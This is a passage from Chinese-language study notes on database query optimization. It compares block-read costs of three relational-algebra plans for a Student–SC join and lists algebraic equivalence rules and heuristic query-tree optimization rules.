块；SC 表有 10000 行，每块装 50 行，所以需要 200 块。</li><li>由于 student 表需要 100 个内存块，而分配给它的只有 5 个，所以不可能一次全部装入内存，每次只能装入一部分，比较完了再装入另外一部分。每换一批数据，内标就需要全部重新装入以便，所以为了减少内表循环装入的次数，就必须尽可能的分配内存给外表</li><li>连接后的元组<strong>装满一块</strong>后就写到中间文件上</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT Student.name</span><br><span class="line">FROM Student,SC</span><br><span class="line">WHERE Student.Sno=SC.Sno AND SC.Cno=&#x27;2&#x27;;</span><br></pre></td></tr></table></figure><p>系统可以用多种等价的<strong>关系代数表达式</strong>来完成这一查询，这里只举三种情况</p><h4 id="1情况1"><a class="markdownIt-Anchor" href="#1情况1">#</a> （1）情况 1</h4><p><code>Student</code>  与 <code>Sc</code>  作<strong>笛卡尔积</strong>，而后作<strong>行选择</strong>运算（选择条件为 <code>Student.Sno=SC.Sno AND SC.Cno='2'</code> ），最后进行<strong>投影操作</strong><br><strong>①：计算广义笛卡尔积</strong><br>操作：</p><ul><li>在内存中尽可能多地装入某个表 (如 <code>Student</code>  表) 的若干块，<strong>留出一块存放另一个表 (如 <code>SC</code>  表) 的元组</strong>；</li><li>然后把 <code>SC</code>  中的每个元组和 <code>Student</code>  中每个元组<strong>连接</strong>，连接后的元组<strong>装满一块后就写到中间文件上</strong>，再从 <code>SC</code>  中读入一块和内存中的 <code>Student</code>  元组连接，直到 <code>SC</code>  表处理完；</li><li>这时再一次读入若干块 <code>Student</code>  元组，读入一块 <code>SC</code>  元组，重复上述处理过程，直到把 <code>Student</code>  表处理完<br>块数：</li><li>读一遍 <code>Student</code>  表所需块数为 = 1000/10 = 100 块</li><li>读一遍 <code>SC</code>  表所需要块数为 = 10000/50 = 200 块</li><li>由于 <code>Student</code>  表可用块数为 5 块，所以分 100/5 = 20 次读入</li><li>同时， <code>Student</code>  表的每一部分读入内存时， <code>SC</code>  表都需要重新读一遍，以此完成与 <code>Student</code>  表的连接。所以需要读入 200×20=4000 块</li><li><strong>所以笛卡尔积读取总块数为 100+4000=4100 块</strong></li><li>Student 表和 SC 表做笛卡尔积共 10<sup>7 行，每块装 10 行，所以中间结果块数 10</sup>6 块（写入）<br><strong>②作选择操作</strong><br>块数：</li><li><strong>所读块数为</strong> 10^6 块</li><li>选择后的结果只有 50 个<br><strong>③作投影操作</strong></li><li>无需读写<br><strong>情况 1 读取总块数</strong>：<br><strong>4100（读）+10<sup>6（写）+10</sup>6（读）。约为 200 万块</strong></li></ul><h4 id="2情况2"><a class="markdownIt-Anchor" href="#2情况2">#</a> （2）情况 2</h4><p><code>Student</code>  与 <code>Sc</code>  作<strong>自然连接</strong>，而后作<strong>行选择</strong>运算（选择条件为 <code>Student.Sno=SC.Sno AND SC.Cno='2'</code> ），最后进行<strong>投影操作</strong><br>①：计算自然连接<br><strong>块数</strong>：</p><ul><li>首先读 <code>Student</code>  和 <code>SC</code> ，与情况 1 一致。因此<strong>总块数 = 4100 块</strong></li><li><strong> <code>Student</code>  和 <code>SC</code>  自然连接后右 10000 行，所以</strong>中间结果块数 **  10000/10 = 1000 块<br>②选择操作</li><li>读入中间结果，<strong>块数 = 1000 块</strong><br>③：作投影操作</li><li>50 个结果可以不用写入<br>情况 2 的总读取块数：<br>4100（读） + 1000（写） + 1000 （读） 共计 6100 块</li></ul><h4 id="3情况3"><a class="markdownIt-Anchor" href="#3情况3">#</a> （3）情况 3</h4><p>首先 <code>Sc</code>  作<strong>行选择</strong>（选择条件为 <code>SC.Cno='2'</code> ），而后作<strong>自然连接</strong>运算，最后进行<strong>投影操作</strong><br><strong>块数</strong>：</p><ul><li>先对 <code>SC</code>  表作<strong>选择操作</strong>，<strong>只需读一遍 <code>SC</code>  表，存取块数为 100 块</strong>，因为满足条件的元组仅 50 个，<strong>不必使用中间文件</strong></li><li>读取 <code>Student</code>  表，把读入的 <code>Student</code>  元组和内存中的 <code>SC</code>  元组作连接。<strong>也只需读一遍 <code>Student</code>  表，共 100 块</strong>，把连接结果投影输出<br>总数：共计 300 块</li></ul><h2 id="查询优化之代数优化"><a class="markdownIt-Anchor" href="#查询优化之代数优化">#</a> 查询优化之代数优化</h2><p>【概念】 <strong>代数优化</strong>是指关系代数表达式的优化，1 即按照一定规则，通过对关系代数表达式进行等价变化，改变代数表达式中操作的次序和组合，使查询更加高效</p><h4 id="关系代数表达式的等价变化规则"><a class="markdownIt-Anchor" href="#关系代数表达式的等价变化规则">#</a> 关系代数表达式的等价变化规则</h4><p><strong>（1）连接，笛卡儿积，并，交的交换律</strong><br>很简单，即上述几种运算都是可交换的，即两个集合进行上述运算，其前后位置可以发生改变。<br><strong>（2）连接，笛卡儿积，并和交的结合律</strong><br>同理，和集合的结合律一样，这里不再阐述。<br><strong>（3）投影的而串接定律</strong><br>关系的两次投影操作可以合并成为一次操作<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mo>∏</mo><mrow><msub><mi>A</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>A</mi><mn>2</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>A</mi><mi>n</mi></msub></mrow></msub></mrow><annotation encoding="application/x-tex">\prod_{A_1,A_2,...A_n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.185818em;vertical-align:-0.43581800000000004em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∏</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.17862099999999992em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mpunct mtight">,</span><span class="mord mtight"><span class="mord mathnormal mtight">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mpunct mtight">,</span><span class="mord mtight">.</span><span class="mord mtight">.</span><span class="mord mtight">.</span><span class="mord mtight"><span class="mord mathnormal mtight">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.16454285714285719em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.43581800000000004em;"><span></span></span></span></span></span></span></span></span></span>(<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mo>∏</mo><mrow><msub><mi>B</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>B</mi><mn>2</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>B</mi><mi>n</mi></msub></mrow></msub></mrow><annotation encoding="application/x-tex">\prod_{B_1,B_2,...B_n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.185818em;vertical-align:-0.43581800000000004em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∏</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.17862099999999992em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:-0.05017em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mpunct mtight">,</span><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:-0.05017em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mpunct mtight">,</span><span class="mord mtight">.</span><span class="mord mtight">.</span><span class="mord mtight">.</span><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.16454285714285719em;"><span style="top:-2.357em;margin-left:-0.05017em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.43581800000000004em;"><span></span></span></span></span></span></span></span></span></span>(E)) ≡ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mo>∏</mo><mrow><msub><mi>A</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>A</mi><mn>2</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>A</mi><mi>n</mi></msub></mrow></msub></mrow><annotation encoding="application/x-tex">\prod_{A_1,A_2,...A_n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.185818em;vertical-align:-0.43581800000000004em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∏</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.17862099999999992em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mpunct mtight">,</span><span class="mord mtight"><span class="mord mathnormal mtight">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mpunct mtight">,</span><span class="mord mtight">.</span><span class="mord mtight">.</span><span class="mord mtight">.</span><span class="mord mtight"><span class="mord mathnormal mtight">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.16454285714285719em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.43581800000000004em;"><span></span></span></span></span></span></span></span></span></span>(E)<br><strong>（4）选择的串接定律</strong><br>选择的两次投影操作可以合并为一次完成<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>σ</mi><mrow><mi>F</mi><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">\sigma_{F1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>(<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>σ</mi><mi>F</mi></msub><mn>2</mn></mrow><annotation encoding="application/x-tex">\sigma_F2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.79444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">2</span></span></span></span>(E)) ≡ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>σ</mi><mrow><mi>F</mi><mn>1</mn><mo>∩</mo><mi>F</mi><mn>2</mn></mrow></msub></mrow><annotation encoding="application/x-tex">\sigma_{F1∩F2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span><span class="mord mtight">1</span><span class="mbin mtight">∩</span><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>(E)<br><strong>（6）选择与笛卡儿积的交换律</strong><br>① <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>σ</mi><mi>F</mi></msub></mrow><annotation encoding="application/x-tex">\sigma_{F}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>(<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>E</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">E_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> × <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>E</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">E_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>) = <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>σ</mi><mi>F</mi></msub></mrow><annotation encoding="application/x-tex">\sigma_{F}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>(<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>E</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">E_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>) × <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>E</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">E_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><br> 对于选择条件只与其中一个关系有关，则应该先对那个关系做出选择，然后再做笛卡儿积。<br>②<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>σ</mi><mi>F</mi></msub></mrow><annotation encoding="application/x-tex">\sigma_{F}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>(<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>E</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">E_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> × <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>E</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">E_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>) = <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>σ</mi><mrow><mi>F</mi><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">\sigma_{F1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>(<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>E</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">E_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>) × <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>σ</mi><mrow><mi>F</mi><mn>2</mn></mrow></msub></mrow><annotation encoding="application/x-tex">\sigma_{F2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>(<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>E</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">E_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>)<br> 选择条件对两个关系都有关，则应该先分别做选择，然后再做笛卡尔积。</p><h4 id="查询树的启发式优化"><a class="markdownIt-Anchor" href="#查询树的启发式优化">#</a> 查询树的启发式优化</h4><ul><li>这是对关系代数表示的查询树进行优化的方法</li></ul><h5 id="典型的启发式规则"><a class="markdownIt-Anchor" href="#典型的启发式规则">#</a> 典型的启发式规则</h5><ul><li><strong>【规则 1】选择运算应尽可能先做</strong>：这是为了<strong>减少中间结果的规模</strong></li><li><strong>【规则 2】投影和选择运算同时进行</strong>：这是为了<strong>避免重复扫描</strong></li><li><strong>【规则 3】将投影运算与其前后的双目运算结合起来</strong>：这是为了<strong>避免重复扫描</strong></li><li><strong>【规则 4】把某些选择运算和其前面的笛卡尔积结合起来成为一个连接运算</strong>：这是为了<strong>减少中间结果的规模</strong></li><li><strong>【规则 5】提取公共子表达式（公因子）</strong>：这是为了<strong>保存计算结果，避免重复计算</strong></li></ul><h5 id="实现算法"><a class="markdownIt-Anchor" href="#实现算法">#</a> 实现算法</h5><ul><li><strong>该算在遵循启发式规则，并应用关系代数表达式等价变换规则来优化关系表达式</strong></li><li><strong>该算法的输入和输出都是查询树（分别对应待优化和优化的关系表达式）</strong><br><strong>算法步骤：</strong></li><li><strong>【步骤 1】分解选择运算</strong>：这是为了<strong>便于不同的选择运算沿树的不同分枝向树叶移动，一直移动到与这个选择条件相关的关系处，使选择尽可能先做</strong></li></ul><h1 id="七并行控制技术"><a class="markdownIt-Anchor" href="#七并行控制技术">#</a> 七，并行控制技术</h1><h2 id="并发控制技术概述"><a class="markdownIt-Anchor" href="#并发控制技术概述">#</a> 